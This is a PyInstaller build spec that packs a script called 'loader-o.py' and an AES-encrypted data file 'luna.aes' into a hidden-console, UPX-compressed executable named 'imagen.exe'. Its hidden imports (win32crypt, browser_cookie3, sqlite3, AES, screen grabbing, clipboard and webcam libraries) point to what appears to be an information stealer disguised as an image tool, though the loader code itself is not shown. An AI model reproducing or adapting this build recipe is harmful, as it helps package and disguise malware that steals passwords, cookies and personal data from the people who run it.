# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['loader-o.py'],
    pathex=[],
    binaries=[],
    datas=[('luna.aes', '.')],
    hiddenimports=['json', 'requests_toolbelt', 'concurrent.futures', 'subprocess', 'sys', 'ctypes', 'base64', 'shutil', 'psutil', 'pycountry', 'shutil', 'sqlite3', 'win32crypt', 'Cryptodome.Cipher.AES', 'psutil', 'typing', 'browser_cookie3', 'psutil', 're', 'psutil', 'Cryptodome.Cipher.AES', 'PIL.ImageGrab', 'win32crypt', 're', 'pyperclip', 'cv2'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='imagen.exe',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    version='version.txt',
    icon='NONE',
)
